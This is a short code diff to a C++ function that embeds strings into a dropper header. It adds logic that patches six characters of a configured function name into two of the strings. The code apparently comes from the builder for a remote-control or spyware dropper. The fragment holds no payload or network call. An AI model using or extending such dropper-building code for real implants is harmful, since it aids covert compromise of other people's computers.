@@ -234,17 +234,23 @@ std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DropperHeader* header, ch
 	p += strings.size() * sizeof(DWORD);
 	
 	header->strings.offset = offset_(p);
+	unsigned int idx = 0;
 	for ( std::list<std::string>::iterator iter = strings.begin();
 		iter != strings.end(); 
-		iter++ )
+		iter++, idx++ )
 	{
 		// store offset of string
 		DWORD offset =  offset_(p) - header->strings.offset; 
 		(*strOffset) = offset;
 		strOffset++;
-		
+
 		// store string data
 		(void) memcpy( p, (*iter).c_str(), (*iter).size() + 1);
+		if (idx == STRIDX_COMMAHFF8)
+			memcpy(p+2, rcs.func().c_str(), 6);
+		else if (idx == STRIDX_HFF5)
+			memcpy(p, rcs.func().c_str(), 6);
+
 		cout << __FUNCTION__ << " embedding string: " << p << " [" << (*iter).size() + 1 << " bytes]" << endl;
 		
 		p += (*iter).size() + 1;
